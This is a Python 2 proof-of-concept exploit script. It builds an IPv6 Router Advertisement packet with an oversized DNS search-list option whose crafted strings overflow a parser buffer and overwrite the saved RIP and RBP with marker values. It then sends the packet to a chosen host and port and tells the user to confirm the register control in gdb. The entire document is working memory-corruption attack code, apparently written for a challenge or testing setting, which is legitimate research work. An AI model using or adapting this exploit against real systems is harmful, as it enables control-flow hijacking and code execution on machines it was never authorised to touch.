import sys
import socket
import os
import struct

packet_start = [ 0x33, 0x33, 0x00, 0x00, 0x00, 0x01, 0x08, 0x00, 0x27, 0xf0, 0x94, 0xd3, 0x86, 0xdd, 0x60, 
                 0x00, 0x00, 0x00, 0x00, 0xa8, 0x3a, 0xff, 0xfe, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                 0x0a, 0x00, 0x27, 0xff, 0xfe, 0xf0, 0x94, 0xd3, 0xff, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x86, 0x00, 0x04, 0xb1, 0x40, 0x18, 
                 0x00, 0x1e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ]

dns_option_type = [0x1f, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8]

first_str = [ 0xff ] #79
first_str += [0x61] * 0xff

## Overwrites J
second_str = [0xb1]
second_str += [0x62] * 0xa9
second_str += [0x40, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]

fourth_str = [0xff]
fourth_str += [0x63] * 0xef
fourth_str += [0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde]
fourth_str += [0xfe, 0xca, 0xbe, 0xba, 0xfe, 0xca, 0xbe, 0xba]


end_packet= [0x00, 0x00]

packet = packet_start + dns_option_type + first_str + second_str + fourth_str + end_packet
packet += [0x00] * ( 1024 - len(packet) )

def readuntil( s, u ):
    z = ''

    while z.endswith( u ) == False:
        z += s.recv(1)

    return z

def readline( s ):
    return readuntil( s, '\n')

def main( argv ):
    if len(argv) == 3:
        HOST=argv[1]
        PORT=int(argv[2])
    else:
        if 'HOST' not in os.environ or 'PORT' not in os.environ:
            print '[ERROR] target and port must be specified via arguments or variables.'
            sys.exit(1)

        HOST=os.environ['HOST']
        PORT=int(os.environ['PORT'])

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect((HOST, PORT))
    except:
        print '[FAIL] Failed to connect to target %s:%d' %(HOST, PORT)
        sys.exit(1)

    print '[INFO] Connected to %s:%d' %(HOST, PORT)

    l = struct.pack('I', len(packet))

    s.send( l + ''.join(chr(x) for x in packet))

    print '[INFO] Sent packet. Use gdb to test'

    print 'RIP=babecafebabecafe'
    print 'RBP=deadbeefdeadbeef'

if __name__ == '__main__':
    main(sys.argv)